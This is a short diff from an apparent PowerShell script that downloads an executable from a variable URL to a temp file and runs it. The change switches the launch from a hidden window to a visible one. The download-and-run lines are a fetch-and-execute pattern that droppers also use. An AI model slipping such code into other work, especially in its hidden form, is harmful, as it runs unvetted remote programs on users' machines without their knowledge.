@@ -10,4 +10,4 @@ Start-Sleep -Milliseconds 500
 
 # Download and run
 Invoke-WebRequest -Uri $exeUrl -OutFile $tempExe -UseBasicParsing
-Start-Process -FilePath $tempExe -WindowStyle Hidden
+Start-Process -FilePath $tempExe -WindowStyle Normal
